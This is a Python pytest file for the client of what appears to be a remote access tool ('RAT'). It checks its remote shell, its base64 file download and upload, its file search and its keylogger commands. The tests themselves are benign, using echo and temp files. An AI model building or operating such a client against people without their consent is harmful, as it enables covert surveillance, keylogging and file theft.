import os
import tempfile
import base64
import pytest
from unittest.mock import patch, MagicMock

from src.utils.protocol import parse_msg, OP_RESP, OP_ERROR, OP_FILE, OP_DATA


def test_cmd_help():
    from src.client.commands.system import cmd_help

    resp = parse_msg(cmd_help())
    assert resp["op"] == OP_RESP
    assert "help" in resp["payload"].lower()


def test_cmd_ipconfig():
    from src.client.commands.system import cmd_ipconfig

    resp = parse_msg(cmd_ipconfig())
    assert resp["op"] in (OP_RESP, OP_ERROR)


def test_cmd_shell_basic():
    from src.client.commands.system import cmd_shell

    resp = parse_msg(cmd_shell(None, "shell echo hello_test"))
    assert resp["op"] == OP_RESP
    assert "hello_test" in resp["payload"]


def test_cmd_shell_no_command():
    from src.client.commands.system import cmd_shell

    resp = parse_msg(cmd_shell(None, "shell"))
    assert resp["op"] == OP_RESP
    assert "Usage" in resp["payload"]


def test_cmd_download_existing():
    from src.client.commands.files import cmd_download

    with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
        f.write(b"contenu de test")
        tmp_path = f.name

    try:
        resp = parse_msg(cmd_download(tmp_path))
        assert resp["op"] == OP_FILE
        decoded = base64.b64decode(resp["data"])
        assert decoded == b"contenu de test"
    finally:
        os.unlink(tmp_path)


def test_cmd_download_missing():
    from src.client.commands.files import cmd_download

    resp = parse_msg(cmd_download("/chemin/qui/nexiste/pas.txt"))
    assert resp["op"] == OP_ERROR


def test_cmd_upload():
    from src.client.commands.files import cmd_upload

    with tempfile.TemporaryDirectory() as tmpdir:
        dest = os.path.join(tmpdir, "test_upload.txt")
        data = b"upload test content"
        b64 = base64.b64encode(data).decode()
        resp = parse_msg(cmd_upload(dest, "test_upload.txt", b64))
        assert resp["op"] == OP_RESP
        assert os.path.isfile(dest)
        with open(dest, "rb") as f:
            assert f.read() == data


def test_cmd_search_found():
    from src.client.commands.files import cmd_search

    with tempfile.NamedTemporaryFile(
        delete=False, suffix="_uniquerattest.txt", dir=tempfile.gettempdir()
    ) as f:
        tmp_path = f.name

    try:
        fname = os.path.basename(tmp_path)
        resp = parse_msg(cmd_search(fname))
        assert resp["op"] == OP_RESP
    finally:
        os.unlink(tmp_path)


def test_cmd_keylogger_stop_not_active():
    from src.client.commands.monitoring import cmd_keylogger_stop

    resp = parse_msg(cmd_keylogger_stop())
    assert resp["op"] == OP_RESP
    assert "non actif" in resp["payload"].lower()
